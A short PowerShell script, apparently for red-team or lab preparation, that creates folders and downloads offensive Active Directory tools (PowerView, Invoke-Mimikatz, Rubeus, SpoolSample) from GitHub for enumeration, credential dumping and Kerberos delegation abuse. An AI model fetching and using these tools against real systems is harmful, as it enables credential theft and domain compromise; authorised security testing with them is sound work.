mkdir Tools
mkdir .\Tools\Enumerate
mkdir .\Tools\Credentials 
# ENUMERATION
# ===========
# PowerView
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile .\PowerView.ps1

# CREDENTIALS
# ===========
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" -OutFile .\Invoke-Mimikatz.ps1

# MULTI PURPOUSE
# ==============
# Rubeus
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Rubeus.exe" -OutFile .\Rubeus.exe

# Unconstrained delegation
Invoke-WebRequest -Uri "https://github.com/jtmpu/PrecompiledBinaries/raw/master/SpoolSample.exe" -OutFile .\SpoolSample.exe


